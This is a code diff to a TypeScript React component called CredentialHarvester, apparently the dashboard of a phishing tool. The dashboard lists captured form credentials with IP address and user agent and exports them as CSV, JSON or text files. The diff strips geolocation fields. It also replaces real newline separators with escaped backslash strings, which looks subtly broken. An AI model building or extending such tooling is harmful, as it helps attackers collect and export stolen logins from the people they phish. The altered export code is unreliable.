@@ -18,10 +18,6 @@ export type CapturedCredential = {
     timestamp: string; // ISO String
     ipAddress?: string;
     userAgent?: string;
-    city?: string;
-    country?: string;
-    latitude?: number;
-    longitude?: number;
     [key: string]: any; // Allows for arbitrary keys from form fields
 };
 
@@ -49,7 +45,7 @@ export function CredentialHarvester({ credentials, onClear, onRefresh }: Credent
     }
     
     // Fields to exclude from the main credentials loop
-    const metaFields = ['timestamp', 'ipAddress', 'userAgent', 'city', 'country', 'latitude', 'longitude', 'source'];
+    const metaFields = ['timestamp', 'ipAddress', 'userAgent', 'source'];
 
     const downloadFile = (content: string, fileName: string, contentType: string) => {
         const a = document.createElement("a");
@@ -75,7 +71,7 @@ export function CredentialHarvester({ credentials, onClear, onRefresh }: Credent
                 content = [
                     headers.join(','),
                     ...credentials.map(row => headers.map(header => JSON.stringify(row[header])).join(','))
-                ].join('\r\n');
+                ].join('\\r\\n');
                 downloadFile(content, `${fileName}.csv`, 'text/csv;charset=utf-8;');
                 break;
             case 'json':
@@ -84,8 +80,8 @@ export function CredentialHarvester({ credentials, onClear, onRefresh }: Credent
                 break;
             case 'txt':
                 content = credentials.map(cred => {
-                    return Object.entries(cred).map(([key, value]) => `${key}: ${value}`).join('\n');
-                }).join('\n\n---\n\n');
+                    return Object.entries(cred).map(([key, value]) => `${key}: ${value}`).join('\\n');
+                }).join('\\n\\n---\\n\\n');
                 downloadFile(content, `${fileName}.txt`, 'text/plain;charset=utf-8;');
                 break;
         }
@@ -122,7 +118,7 @@ export function CredentialHarvester({ credentials, onClear, onRefresh }: Credent
                                             <p className="text-sm text-muted-foreground">
                                                 {new Date(cred.timestamp).toLocaleString()}
                                             </p>
-                                            <Badge variant="outline">{cred.ipAddress}</Badge>
+                                            <Badge variant="outline">{cred.ipAddress || 'Unknown IP'}</Badge>
                                         </div>
                                         <div className="space-y-1 font-mono text-xs">
                                             {Object.entries(cred)
@@ -134,18 +130,7 @@ export function CredentialHarvester({ credentials, onClear, onRefresh }: Credent
                                                     </div>
                                                 ))}
                                             <hr className="border-border my-2"/>
-                                            <div className="grid grid-cols-3">
-                                                <strong className="font-sans col-span-1 text-muted-foreground font-medium">Location:</strong>
-                                                <span className="col-span-2 break-all">{cred.city || 'N/A'}, {cred.country || 'N/A'}</span>
-                                            </div>
-                                             <div className="grid grid-cols-3">
-                                                <strong className="font-sans col-span-1 text-muted-foreground font-medium">Coords:</strong>
-                                                <span className="col-span-2 break-all">{cred.latitude ? `${cred.latitude}, ${cred.longitude}`: 'N/A'}</span>
-                                            </div>
-                                             <div className="grid grid-cols-3">
-                                                <strong className="font-sans col-span-1 text-muted-foreground font-medium">User Agent:</strong>
-                                                <span className="col-span-2 break-all">{cred.userAgent}</span>
-                                            </div>
+                                            <p className="text-xs text-muted-foreground truncate"><strong>UA:</strong> {cred.userAgent}</p>
                                         </div>
                                     </div>
                                 ))}
